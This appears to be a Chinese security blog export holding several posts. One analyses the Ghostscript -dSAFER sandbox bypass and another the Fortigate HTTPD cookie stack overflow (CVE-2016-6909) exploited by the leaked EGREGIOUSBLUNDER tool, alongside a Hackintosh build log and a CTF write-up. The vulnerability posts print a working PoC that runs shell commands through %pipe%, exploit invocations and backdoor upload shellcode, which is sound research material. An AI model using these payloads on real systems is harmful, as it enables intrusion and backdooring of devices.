加上-dSAFER参数后，出现invalidfileaccess错误：1234567891011121314vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFERGS&gt;/buff 1024 string defGS&gt;/file_obj (/etc/passwd) (r) file defError: /invalidfileaccess in --file--Operand stack: file_obj (/etc/passwd) (r)Execution stack: %interp_exit .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval-- --nostringval-- %loop_continue --nostringval-- --nostringval-- false 1 %stopped_push .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval--Dictionary stack: --dict:982/1684(ro)(G)-- --dict:0/20(G)-- --dict:79/200(L)--Current allocation mode is localLast OS error: No such file or directoryCurrent file position is 33GS&lt;3&gt; PoC分析测试多个PostScript操作可以绕过-dSAFER提供的保护，这可以允许攻击者使用任意参数执行命令。首先对Tavis提供的PoC进行测试，在开启了安全沙箱的情况下（-dSAFER），可以成功执行任意shell命令： 1234567vuln@ubuntu:~$ gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/nullGS&gt;legalGS&gt;{ null restore } stopped { pop } ifGS&gt;legalGS&gt;mark /OutputFile (%pipe%id) currentdevice putdevicepropsGS&lt;1&gt;showpageuid=1000(topsec) gid=1000(topsec) groups=1000(topsec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) 再比如使用前面提到的ImageMagick工具中的convert命令测试，可以看到ImageMagick同样受到了该漏洞的影响： 在源码目录下使用命令grep -nr dSAFER找到和该选项相关的信息，看到下面这段注释中说明了该选项的效果——将LockSafetyParams设置为true。 再次使用grep命令查看和LockSafetyParams相关的代码，通过注释看到，这个变量值为true时，可以阻止某些不安全的更改。 同时在文件psi/zdevice2.c的第269行，LockSafetyParams被设置为了False，且仅有此处修改了该变量，因此可以推测：Ghostscript在解析PoC中某条PostScript语句时触发了这段代码。 调试分析过程接下来我们通过调试来验证前面的猜想，使用GDB调试Ghostscript并设置好程序参数，根据前面grep的输出，在“dev_old-&gt;LockSafetyParams = false; ”这段代码所在函数restore_page_device()中设置断点。 12345678pwndbg&gt; set args -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/nullpwndbg&gt; b restore_page_deviceBreakpoint 1 at 0xa9395e: file ./psi/zdevice2.c, line 256.pwndbg&gt; rStarting program: /usr/local/bin/gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.GS&gt; 程序运行起来后，根据PoC输入代码： 首先设置成像区域——legal（a4、b5、letter等也可以）： 接着输入{null restore} stopped {pop} if，程序中断在此处： 再对dev_old-&gt;LockSafetyParams变量设置观察点，继续运行程序两次以后，和我们预想的结果一样——LockSafetyParams的值在这里被改变了。 123456789pwndbg&gt; cContinuing.Hardware watchpoint 2: dev_old-&gt;LockSafetyParamsOld value = 1New value = 0restore_page_device (pgs_old=0x219cbd8, pgs_new=0x274d630) at ./psi/zdevice2.c:269269 dev_old-&gt;LockSafetyParams = false; 这里要注意的是，用例如GCC开启了优化选项（如-O3），那么某些变量可能会被优化掉，比如这里为变量dev_old-&gt;LockSafetyParams设置观察点时，按照默认配置编译的情况下GDB会提示value has been optimized out，这就是前面编译时要使（-O0）的原因，实际上在调试程序时，我们都应该使用该选项。 使用bt命令查看栈回溯，发现当前函数在一系列带有“interpret”的函数中被调用，从名称推断这些函数用于解析PostScript语句，并且我们现在处于restore操作符相关的函数中。 所以要找到解释器解析操作符的函数，可以使用两次finish命令到栈帧#3中，可以看到interp()函数应该是通过call_operator宏来执行各种操作符的。 在调用call_operator宏的这一行下断，断下后单步跟进call_operator，观察到了解释器处理stop、restore等操作符的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。 漏洞成因探究经过上面的分析我们可以知道简单的一条{null restore} stopped {pop} if就能绕过SAFER沙箱，但其原理又是什么呢，下面就来具体分析一下。 PostScript是一种“逆波兰式”（也称为后缀表达式）的语言，熟悉数据结构的读者想必立刻就明白了。简单来说，就是将操作数放在操作符之前。例如计算表达式(3 + 4) * (5 - 8)的过程如下： 123$ gs -q -sDEVICE=ppmrawGS&gt;3 4 add 5 8 sub mul ==-21 上述代码的每个步骤如下表所示，采用这种方式的好处是不需要对表达式进行语法分析，所以解释器可以设计的较为简单。 处理的符号 操作 栈的内容 3 压栈 3 4 压栈 3 4 add 出栈栈顶两个元素，计算加法，计算结果压栈 7 5 压栈 7 5 8 压栈 7 5 8 sub 出栈栈顶两个元素，计算减法，计算结果压栈 7 -3 mul 出栈栈顶两个元素，计算乘法，计算结果压栈 -21 == 出栈栈顶一个元素，并显示 NULL 大多数的编程语言都实现了异常处理机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件），同样的PostScript也不例外。我们可以通过将代码包含在{…} stopped中来捕获运算符中的错误，就如同PoC中这样 12345{ null restore } stopped { pop} if 对于大多数运算符而言，null不是合法的操作数，stopped捕获到了前面的语句中发生的错误，它将终止该过程并执行stopped操作符后{}中的过程。 完整过程如下： PostScript中有一对运算符save和restore，分别用来保存和恢复虚拟内存状态的快照，PoC中的null restore语句执行时，相关函数restore_page_device()会将LockSafetyParams设置为false，以便它有权限可以正确配置已恢复的设备，但是还未来得及恢复LockSafetyParams的值便引起类型检查错误（/typecheck error）。接着stopped捕获到异常，弹出栈顶元素null，GS继续运行，此时LockSafetyParams就是一直为false的状态。 值得一提的是，GhostScript的官方文档中提到了restore操作符存在导致绕过SAFER模式的风险。 漏洞利用OutputFile参数用于设置输出文件名，另外在Linux/Unix上，还可以通过设备%pipe%将输出发送到管道（Windows中也可以，需要使用两个%）。例如，要将输出通过管道传输到lpr可以使用：/OutputFile (%pipe%lpr）。查阅官方文档可知，%pipe%功能由popen函数支持，在调试中也能确认这一点： popen()函数通过创建管道的方式，调用fork()启动一个子进程，并将传入popen()的命令送到/bin/sh以-c参数执行。可以通过在此处注入命令实现漏洞利用，如下图中演示的那样，另外将PostScript编码到图像中，可以在使用GhostScript的Web服务器上执行任意指令（例如服务器使用ImageMagick处理上传的图像时）。 参考资料More Ghostscript Issues: Should we disable PS coders in policy.xml by default?PostScript Language Reference(third edition)PostScript语言安全研究(ImageMagick新漏洞分析Ghostscript官方文档A GHOST FROM POSTSCRIPT","link":"/post/40555.html"},{"title":"Mountains","text":"你惊心动魄，而世界一无所知；你翻山越岭，而天地寂静无声。","link":"/post/f523a56f.html"},{"title":"CVE-2016-6909——Fortigate防火墙HTTPD栈溢出漏洞","text":"TL;DR 对Fortigate固件和启动的流程的静态分析 在Fortigate防火墙中建立调试环境 Fortigate防火墙HTTPD栈溢出漏洞(CVE-2016-6909 )的分析 对Equation Group利用工具EGREGIOUSBLUNDER的分析 2016年，Shadow Brokers公开了黑客组织Equation Group针对各大厂商防火墙的漏洞利用工具遭到泄露。笔者找到了一个Fortigate防火墙的虚拟机版——FGT_VM-v400-build0482，正巧就在受漏洞影响的版本范围内，遂对利用工具中的EGREGIOUSBLUNDER进行了一番深入分析。相比起其他工具的奇葩名字，EGREGIOUSBLUNDER （令人震惊的错误）倒是十分贴切的。它利用了[CVE-2016-6909——Fortigate防火墙Web管理界面HTTP cookie的栈溢出漏洞，直接覆盖返回地址就可以控制程序指针，经典的栈溢出。按理说这种漏洞什么太高的技术含量，但是在防火墙上动态调试环境的搭建以及该工具中shellcode的编写都挺有意思的，所以觉得还是记录一下。 环境搭建和工具介绍Fortigate防火墙配置启动防火墙后，我们可以看到用于配置防火墙的CLI，这并不是底层系统的交互式shell，只能输入下面几个命令：1234567891011Fortigate-VM login: adminPassword: #默认密码为空Welcome !Fortigate-VM #config config objectget get dynamic and system informationshow show configurationdiagnose diagnose facilityexecute execute static commandsexit exit CLI EGREGIOUSBLUNDER工具使用该工具需要指定很多参数，特比是需要指定一个特别的栈地址，而该地址在不同产品上都不相同吗，因此程序还附带了一个配置文件EGBL.config，里面记录了不同型号产品的相关参数。 EGBL.config的开头有几项配置，可以更改上传的后门、上传后的文件名以及执行后的进程名。 12345678# path/name of local, static-built noserver to upload NOSERV = /root/noserver# path/name of local noclient to run, should match version of server NOCLI = /root/noclient# name of noserver file on target NONAME = /bin/httpd# name of process on target NOFAKE = /bin/httpsd 还需要一个登录Web界面时设置的cookie的值，获取方式如下：12$ curl -X HEAD -v http://192.168.123.100/login 2&gt;&amp;1 | grep APSCOOKIE(standard input):15:&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 31-Dec-1968 16:48:05 GMT 接着以如下方式执行，如果后面想抓包分析的话指定80端口同时关闭ssl（设置为0），但同时也需要更改防火墙默认配置（开始http支持，默认使用https）。 123456789101112$ ./egregiousblunder -t 192.168.123.100 -p 443 -l 4444 --ssl 1 --nope --gen 4nc --cookienum 3943997904 --stack 0xbffff104loading nopen over HTTPSusing stack addr 0xbffff104built authhash len 116built enc_authhash with len 116received good ACK1 message c0edbabereceived stack addr 0xbffff104sent the file len/header, next is the file..................................done with sending (356996 bytes), waiting for file ackreceived good ACK2 message 356996, upload is cool... Tip: 笔者找到的这个Fortigate VM版的溢出地址值并不在EGBL.config中，所以只能通过一个shell脚本将一个地址范围遍历了一遍才找到正确的地址值。 防火墙Web管理界面登录流程通过WEB方式登陆防火墙时，首先发送POST请求，请求包含登录名和密码。 登录成功后，服务器响应一个APSCOOKIE作为身份验证令牌， 这个cookie值必须包含在任何后续请求中。 接下来看看egregiousblunder发送的数据包，通过发送一个包含精心构造的APSCOOKIE的HTTP请求，将shellcode布置在cookie中。 文件系统和启动流程分析一个设备固件的分析过程，通常包括了对固件文件的解密、文件系统还原、固件文件的修改及重构等。好在VM版的Fortigate并没有加密，我们只需想办法提取到文件系统，然后就是分析系统启动流程，包括内核、内核参数、初始化文件以及系统服务程序等就行。 获取vmdk硬盘中的文件系统给Kali Linux添加一块现有硬盘，选择fortigate的vmdk硬盘。 进入系统后，查看并挂载新添加的硬盘，可以看到硬盘分区中的文件。12345678910111213141516171819202122$ mkdir fortios$ fdisk -lDisk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors...Device Boot Start End Sectors Size Id Type/dev/sdb1 * 1 262144 262144 128M 83 Linux/dev/sdb2 262145 4194304 3932160 1.9G 83 Linux$ mount /dev/sdb1 fortios$ cd fortios &amp;&amp; lltotal 23M-rw-r--r-- 1 root root 5.0M Sep 21 2011 datafs.tar.gz-rw-r--r-- 1 root root 107 Sep 21 2011 extlinux.conflrwxrwxrwx 1 root root 12 Sep 21 2011 flatkc -&gt; ./flatkc.smp-rw-r--r-- 1 root root 256 Sep 21 2011 flatkc.chk-rw-r--r-- 1 root root 1.4M Sep 21 2011 flatkc.nosmp-rw-r--r-- 1 root root 1.5M Sep 21 2011 flatkc.smp-r--r--r-- 1 root root 32K Sep 21 2011 ldlinux.sysdrwx------ 2 root root 12K Sep 21 2011 lost+found-rw-r--r-- 1 root root 15M Sep 21 2011 rootfs.gz-rw-r--r-- 1 root root 256 Sep 21 2011 rootfs.gz.chk 查看所有文件类型，最值得注意的是两个Linux内核（支持和不支持多处理器的内核），还有一个疑似initial ramdisk的文件rootfs.gz，说明这个防火墙是基于Linux的；还有一个SYSLINUX引导加载程序，我们可以查看它的配置文件extlinux.conf查看启动参数，进而确定rootfs.gz就是一个initial ramdisk。 12345678910111213$ file *datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size 8724480extlinux.conf: ASCII textflatkc: symbolic link to ./flatkc.smpflatkc.chk: dataflatkc.nosmp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGAflatkc.smp: Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGAldlinux.sys: SYSLINUX loader (version 4.00)lost+found: directoryrootfs.gz: gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size 19077120rootfs.gz.chk: data$ cat extlinux.confDEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz 继续解压rootfs.gz后是符合FHS的目录结构，只是bin目录被打包压缩了。到这里，整个防火墙的文件系统已经呈现在我们面前了。 12345678910111213141516171819$ file rootfsrootfs: POSIX tar archive (GNU)$ mkdir _rootfs &amp;&amp; mv rootfs _rootfs &amp;&amp; cd _rootfs$ tar xf rootfs$ lltotal 31M-rw-r--r-- 1 root root 8.4M Sep 21 2011 bin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 datadrwxr-xr-x 2 root root 1.0K Sep 21 2011 data2drwxr-xr-x 5 root root 13K Sep 21 2011 devlrwxrwxrwx 1 root root 8 Sep 21 2011 etc -&gt; data/etclrwxrwxrwx 1 root root 1 Sep 21 2011 fortidev -&gt; /drwxr-xr-x 2 root root 1.0K Sep 21 2011 lib-rw-r--r-- 1 root root 4.3M Sep 21 2011 migadmin.tar.xzdrwxr-xr-x 2 root root 1.0K Sep 21 2011 proc-rw-r--r-- 1 root root 19M Sep 21 2011 rootfsdrwxr-xr-x 2 root root 1.0K Sep 21 2011 sbindrwxr-xr-x 2 root root 1.0K Sep 21 2011 tmpdrwxr-xr-x 8 root root 1.0K Sep 21 2011 var 初始化程序init分析显然，导致漏洞的程序十有八九就在/bin目录中，但尝试解压bin.tar.xz时，却发生了错误。按照System V的启动方式来看，首先内核首先启动的程序应该是/sbin/init，因此可以逆向该程序查看bin.tar.xz是如何被解压的。 首先是main函数，以下是经过整理的IDA反编译结果，init程序只做了三件事： 解压bin.tar.xz和migadmin.tar.xz 解压完后删除bin.tar.xz和migadmin.tar.xz 启动/bin/init 123456789101112131415int __cdecl main(){ char *argv; char * const envp[]; if ( decompress((int)\"bin\") &gt;= 0 ) decompress((int)\"migadmin\"); unlink(\"/sbin/xz\"); unlink(\"/sbin/ftar\"); argv = \"/bin/init\"; envp = 0; execve(\"/bin/init\", &amp;argv, &amp;envp); return 0;} 再看看decompress()函数内部，找到解压的参数。 1234567891011121314151617181920212223signed int __cdecl decompress(int a1){ //... snprintf(&amp;s, 0x200u, \"/%s.tar.xz\", a1); //... argv = \"/sbin/xz\"; xz_option_str1 = \"--check=sha256\"; xz_option_str2 = \"-d\"; v19 = &amp;s; v20 = 0; execv(\"/sbin/xz\", &amp;argv); } snprintf(&amp;name, 0x200u, \"/%s.tar\", a1); //...LABEL_21: //... var_438 = \"/sbin/ftar\"; ftar_option_str = \"-xf\"; v14 = &amp;name; v15 = 0; execv(\"/sbin/ftar\", &amp;var_438); return 0;} chroot切换根目录到_rootfs目录解压两个文件 12$ chroot . /sbin/xz -d bin.tar.xz$ chroot . /sbin/ftar -xf bin.tar Tip: 其实进入sbin目录看到两个解压程序xz和ftar就能猜到怎么回事儿了，不过确认一下也好 启动过程分析bin目录中的程序大部分都是指向init和sysctl的软链接，前者实现了防火墙的业务功能，后者类似busybox，提供一些Linux系统命令。 1234567891011121314151617181920$ lltotal 29Mlrwxrwxrwx 1 root root 9 Dec 19 17:31 authd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cat -&gt; /bin/sysctllrwxrwxrwx 1 root root 11 Dec 19 17:31 chmod -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 cmdbsvr -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 cp -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 dhcpd -&gt; /bin/initlrwxrwxrwx 1 root root 9 Dec 19 17:31 fgfmd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 grep -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 httpsd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 ifconfig -&gt; /bin/sysctl-rwxr-xr-x 1 root root 24M Sep 21 2011 initlrwxrwxrwx 1 root root 9 Dec 19 17:31 initXXXXXXXXXXXXXXXXXX -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 mkdir -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ospfd -&gt; /bin/initlrwxrwxrwx 1 root root 11 Dec 19 17:31 sh -&gt; /bin/sysctllrwxrwxrwx 1 root root 9 Dec 19 17:31 ssh -&gt; /bin/init-rwxr-xr-x 1 root root 154K Sep 21 2011 sysctl... 防火墙启动后，将initXXXXXXXXXXXXXXXXXX作为1号进程，接着fork出一系列的子进程实现业务功能。其中名为httpsd的守护进程，也就是Web服务器进程，根据前面的抓包分析，漏洞应该也和这个进程相关。第二个httpsd用于负责处理http请求，退出后由第一个httpsd负责重启。 建立动态调试环境鉴于init的复杂程度（IDA分析出来有5W+的函数，且没有符号），单纯的依靠静态分析都很难定位到实现httpsd的位置，更不用提漏洞的位置了，而fortigate似乎不像Cisco ASA那样集成了gdbserver，所以我们得自己想办法搞定这个问题，总的来说有两个思路： 将init取出来在本地调试运行； 将gdb移植到防火墙上。 可能是由于init这个程序比较特殊，经过各种尝试都没法再本地将init运行起来，因此笔者只好使用了第二种方法，这其中也有很多坑。 编译GDB这部分挺简单的就不展开讲了，但是需要注意下面几点： GDB版本，本文分析的这个防火墙是基于Linux 2.4内核的，太新的GDB也许会有兼容性问题； 静态编译，以免缺失某些库。 将GDB放入防火墙文件系统准备好GDB后，将rootfs再打包回去时，还是要记得用3.2中的方法，使用防火墙自带的ftar工具将rootfs打包回去，否则防火墙无法正常启动。 获取反向shell为了方便后期随时能接入防火墙进行调试，放置GDB的同时还可以放一个后门程序，用于得到一个shell，因为EGREGIOUSBLUNDER用的那个nopen工具是在不怎么好用。 Tip: 但这里存在一个问题——如何在防火墙启动以后，执行后门来得到shell。经过查询，笔者发现在 Fortigate 的配置命令行中，有一条隐藏命令——fnsysctl来执行前面提到过的sysctl，所以该怎么做大家应该都懂了。 漏洞分析定位漏洞位置查看httpsd的PID，然后GDB attach到第二个httpsd进程上，定位漏洞时，开始想在EGREGIOUSBLUNDER参数中使用的那个栈地址设置观察点，结果没有断下来。无奈只好自己构造发送给防火墙和POST数据包，将shellcode部分修改为无意义的数据，造成异常而中断下来。 最后会发现在函数sub_820CB5E()返回时（0x0820CEFB）产生了异常，再在此处下断，并使用EGREGIOUSBLUNDER，这次ret后就来到了栈上的shellcode中，也就说明了当前函数存在栈溢出。 Tip: 写这篇文章与分析的时间相隔了一年，只找到了几张图片，而且调试环境的建立也挺麻烦的，所以这里就没有贴太多调试过程的图片了。 漏洞成因经过调试可知，该函数用解析cookie，经过整理的IDA反编译结果如下。 1234567891011121314151617181920212223int __cdecl decode_cookie(char *a1){ //... unsigned int Era; // [esp+38h] [ebp-11A0h] char Payload; // [esp+14Ch] [ebp-108Ch] char AuthHash; // [esp+116Ch] [ebp-6Ch] //AuthHash位于ebp下108字节 //... size = 1; if ( a1 ) size = strlen(a1) + 1; src = 0; memset(&amp;AuthHash, 0, 0x52u); // v16 = 20; memset(&amp;Payload, 0, 0x1000u); // ptr = 0; v7 = -1; if ( a1 ) { sub_820C6F0(); if ( sscanf(a1, \"Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s\", &amp;Era, &amp;Payload, &amp;AuthHash) == 3 ) { //... 该函数在调用sscanf()将Cookie中Era、Payload和AuthHash三个值放进三个变量，却没有检查传入的AuthHash和Payload字符串大小，从而导致了缓冲区溢出。本例中，AuthHash位于ebp下108字节，EGREGIOUSBLUNDER构造了一个116字节的AuthHash，正好覆盖ebp和返回地址。 shellcode分析Linus Torvalds在他的自传Just for fun中谈过Unix“小即是美”的理念，几乎所有事情都由6个基本的系统调用完成（fork、execve、open、write、read和close），个人觉得EGREGIOUSBLUNDER所使用的shellcode就能完美诠释这个理念，它分为两大部分，分别通过变量AuthHash和Payload布置到内存中，并且使用了大量int 80系统调用，将后门nopen程序上传到防火墙并执行。 第一段shellcode因为栈溢出的空间太小，栈上没有足够的位置放置全部shellcode，所以这段shellcode的目的只是为了定位到已经被分配在堆上的第二段shellcode。12345678910nopnopnopmov ebp, esppop ebxpop ecx ; pop useless parameterpop ecx ; pop useless parameterpop eax ; 指向整个Cookie值的指针add eax, 0Eh ; 指向Cookie中Payload字段值的指针jmp eax ; 转跳到堆中的第二段shellcode(decoding处) 第二段shellcode第二段shellcode在前面提到decode_cookie()函数执行前就已经被放入了一块动态分配的内存中，并且指向该内存的指针作为一个参数传入了decode_cookie()，再通过第一段shellcode转跳过来。其功能是将配置文件EGBL.config中指定的后门上传到防火墙上，并通过execve系统调用替换当前的httpsd进程。 shellcode的首要任务就是定位自己在内存中的位置，即确定EIP指针的当前值，第二段shellcode的开始部分就是做这项工作，具体可以参考Shellcoder’s Programming Uncovered的10.3节。1234567sub_A56D165： pop ecx jmp ecxdecoding: call sub_A56D165;...接着就是一段解码自身的指令。12345678910111213141516;... push eax push ecx push edx push ebx push esp push ebp push esi push edi push ecx pop ecx push 77h ; 'w' inc edi pop eax xor al, 77h;...解码完成后，首先通过getpeername系统调用从0xFF向下遍历可用套接字1234567891011121314151617181920212223242526272829303132333435after_decode: xor ebx, ebx mov edi, esp lea esi, [edi+10h] mov [edi+4], esi lea ecx, [edi+20h] mov [edi+8], ecx mov bl, 10h mov [ecx], ebx xor ecx, ecx mov cl, 0FFhgetpeername: mov [edi], ecx push ecx ; socket fd xor eax, eax mov al, 66h mov bl, 7 mov ecx, edi int 80h ; LINUX - sys_getpeername pop ecx ; fd xor ebx, ebx cmp eax, ebxloc_A56D23D: jnz short loc_A56D249 mov ax, 5C11hloc_A56D243: cmp [esi+2], ax jz short loc_A56D24Bloc_A56D249: loop getpeernameloc_A56D24B: mov ebx, ecx ; socket fd xor ecx, ecxloc_A56D24F: mov cl, 3找到可用套接字后，将文件描述符0、1、2重定向到socket。123456789101112131415161718sys_dup2: xor eax, eax mov al, 3Fh dec ecx int 80h ; LINUX - sys_dup2 inc ecx loop sys_dup2 mov ebp, esp sub esp, 420h mov [ebp-4], ebx xor eax, eax mov [ebp-8], eax sub eax, 1 mov [ebp-0Ch], eax mov [ebp-10h], esp sub esp, 10h mov [ebp-424h], esp jmp short write使用wirte系统调用发送确认ack1，其中包含了当前ebp的的信息，攻击程序收到该ACK确认消息后，会根据ebp-64h计算出实际的溢出地址作为提示消息。若发送的地址和收到的地址不同还会弹出警告。123456789101112131415sys_write: mov eax, [ecx+0Ch] xor eax, 0C0EDBABEh mov [ecx+8], eax mov eax, [ecx+14h] xor eax, ebp mov [ecx+10h], eax mov edx, 25h push edx ; len push ecx ; buffer 0xa56d2ae mov ebx, [ebp-4] push ebx ; socket fd 0x6 mov eax, 4 int 80h ; LINUX - sys_write jmp short sys_read然后通过read接收发送的后门文件长度、文件头等信息。123456789101112131415161718192021222324sys_read: mov edx, 25h ; '%' push edx ; len mov ecx, [ebp-10h] push ecx ; buffer mov ebx, [ebp-4] ; socket fd 0x6 push ebx mov eax, 3 int 80h ; LINUX - sys_read cmp eax, 25h ; '%' jnz loc_A56D40C mov eax, [ebp-10h] mov ebx, [eax+8] mov ecx, [eax+0Ch] xor ebx, ecx ; filesize mov [ebp-8], ebx mov esi, [ebp-10h] add esi, 18h mov edi, [ebp-424h] mov ecx, 8 rep movsb xor eax, eax mov [ebp-428h], eax jmp open上述步骤完成后，用open系统调用在防火墙上打开一个文件，并且再次使用read接收后门文件。1234567891011sys_open: mov edx, 1C0h ; mode(-rwx------) push edx mov ecx, 241h push ecx ; flags push ebx ; filename mov eax, 5 int 80h ; LINUX - sys_open mov [ebp-0Ch], eax ; nopen fd xor eax, eax mov [ebp-1Ch], eax再次通过write将接收到的后门文件数据写入刚才打开的文件中。1234567891011121314151617181920sys_write2: inc edi loop loc_A56D368 mov [ebp-428h], edx mov edx, [ebp-14h] ; len push edx mov ecx, [ebp-10h] ; addr push ecx mov ebx, [ebp-0Ch] ; backdoor fd push ebx mov eax, 4 int 80h ; LINUX - sys_write mov ecx, [ebp-1Ch] add ecx, eax mov [ebp-1Ch], ecx mov ecx, [ebp-8] sub ecx, eax mov [ebp-8], ecx jcxz loc_A56D3B2 ; loop until the file write complete jmp short sys_read2文件接收并写入完成后，关闭文件，并且发送第二个确认字符ack2，确认上传后门文件的完整性。12345678910111213sys_write3: mov eax, [ecx+0Ch] mov ebx, [ebp-1Ch] ; filesize xor eax, ebx mov [ecx+8], eax mov edx, 25h ; '%' ; len push edx push ecx mov ebx, [ebp-4] ; socket fd push ebx mov eax, 4 int 80h ; LINUX - sys_write jmp short loc_A56D40C最后调用execve，将当前httpsd进程替换为后门程序123456789101112sys_execve: push eax push edi mov edx, esp push eax push esi mov ecx, esp push edx ; envp push ecx ; argv push ebx ; path mov eax, 0Bh int 80h ; LINUX - sys_execve Tip: 要从EGREGIOUSBLUNDER中直接提取shellcode可能有些困难，所以可以在GDB调试时，等待shellcode自解码完成后dump出指定位置内存放入IDA中分析。另外以上过程省略了一些细节，有兴趣的读者可以自己试试。 总结算起来这应该是笔者分析的第一个二进制漏洞吧，虽然只是一个经典的栈溢出，且目标没有ASLR、NX、Canary等漏洞缓解机制，但当时分析的时候还是感觉很过瘾。特别植入后门的工程化和专业化都很让人着迷，所以在此和大家一同分享，当然因为是第一次分析二进制漏洞，而且时间过去太久，如果文中有任何错误和疏漏欢迎在留言中指出☺。 参考资料FortiGate Configuration examplestar formart (wikipedia)#UStar_format)FortiGate CLI HACKINGShellcoder’s Programming Uncovered（《shellcoder编程揭秘 》【美】Kris Kaspersky著）","link":"/post/d4ec6e34.html"},{"title":"Gigabyte Z390M Gaming Hackintosh","text":"macOS Catalina这个月发布了正式版，正巧最近也想把以前的Z370 ITX主板换成Z390的ATX主板，所以干脆重装了一下系统。目前大部分功能正常，Apple Watch解锁还有些小问题。 EFI地址 macOS版本macOS Catalina 10.15 19A583 正式版 BootLoaderClover_v2.5k_r5073 配置 类型 型号 主板 Gigabyte Z390M Gaming CPU Intel i7 8700k 显卡 Sapphire RX 590 8G D5 超白金版 OC（免驱） 网卡&amp;蓝牙 FV-T919 BCM94360CD（免驱） 内存 Kingston HyperX Predator DDR4 3000 16Gx2 固态硬盘 Samsung 970evo 500G、Plextor M9PeGn 256G、SanDisk Ultra 3D 1T 机械硬盘 WD Blcak 7200RPM 1T、Seagate 酷鱼 2T 7200RPM、Seagate 酷鱼 4T 5400RPM 显示器 Dell P2418D 2K 电源 GreatWall 650W G6 全模金牌 散热 USCORSAIR H100i PRO RGB 240mm 风扇 SAMA 冰洞套装（12cm x 3个） 机箱 CoolerMaster MasterBox NR400 M-ATX 鼠标 Logitech MX Master 键盘 Varmilo MAC双系统机械键盘 87键 茶轴 正常功能： WIFI 有线网络 蓝牙 声音 麦克风 USB 3.0、USB-TypeC 睡眠唤醒 iMessage Siri 隔空投送 接力 独显硬件加速 BIOSBIOS版本：F7 M.I.T. Extreme Memory Profile (X.M.P.) → Profile 1 BIOS Windows 8/10 Features → Other OS CSM Support → Disabled Secure Boot → Disabled Peripherals Initial Display Output → PCIe Slot 1（根据自己的显卡插的位置选择） Intel Platform Trust Technology (PTT) → Disabled Thunderbolt(TM) Configuration TBT Vt-d Base Security → Disabled Thunderbolt Boot Support → Disabled Security Level → No Security USB Configuration Legacy USB Support → Enabled XHCI Hand-off → Enabled Network Stack Configuration Network Stack → Disabled Chipset Vt-d → Disabled Internal Graphics → Enabled DVMT Pre-Alloc → 128M DVMT Total Gfx Mem → 256M Audio Controller → Enabled Above 4G Decoding → Enabled Power ErP → Disabled RC6 (Render Standby) → Enabled 待完善功能 Apple Watch 可解锁App，解锁Mac时有时失败 仍然使用OsxAptioFix2Drv-free2000.efi（似乎是因为我的PCIE槽插满了，另外关掉BIOS中的Internal Graphics后可以使用AptioMemoryFix.efi，详情参考300系列主板正确使用AptioMemoryFix.efi的姿势） 随航（Sidecar）未测试 文件保险柜（FileVault）未测试 安装过程下载macOS Catalina镜像，制作启动盘。可以直接用命令行，也可以使用etcher制作 1234567$ sudo /Applications/Install\\ macOS\\ Catalina.app/Contents/Resources/createinstallmedia --volume /Volumes/SanDisk /Applications/Install\\ macOS\\ Catalina.app --nointeractionPassword:Erasing disk: 0%... 10%... 20%... 30%... 100%Copying to disk: 0%... 10%... 20%... 30%... 40%... 50%... 60%... 70%... 80%... 90%... 100%Making disk bootable...Copying boot files...Install media now available at \"/Volumes/Install macOS Catalina\" 安装bootloader到U盘的EFI分区 剩下的U盘安装克参考tonymacx86： Installation Guide 展示 Clover的minimal主题的背景也修改了一下与Catalina适配 参考资料黑果小兵的部落阁 tonymacx86 300系列主板正确使用AptioMemoryFix.efi的姿势","link":"/post/14472038.html"},{"title":"SEC-T CTF2018 MISC——shredder","text":"##方法一： file查看文件类型12$ file floppyfloppy: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"mkfs.fat\", root entries 112, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, serial number 0xb4d31337, unlabeled, FAT (12 bit), followed by FAT 挂载软盘12345678910$ mount -t msdos ./floppy /mnt/floppy -o loop$ cd /mnt/floppy &amp;&amp; lsshredder$ file shreddershredder: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped$ cat aaaa.txtSECT{AAAAA}$ ./shredder 1 aaaa.txt$ cd -$ umount /mnt/floppy 使用010 editor比较可以发现不同部分和前面新建的aaaa.txt内容大小一致——SECT{AAAAA} 试着将第一个字母S的ASCII53和1D异或得到key的值（逆向分析shredder可知）——4E再讲这部分内容逐字节与4E异或，可以看到原文件的内容 同理可以得到flag: 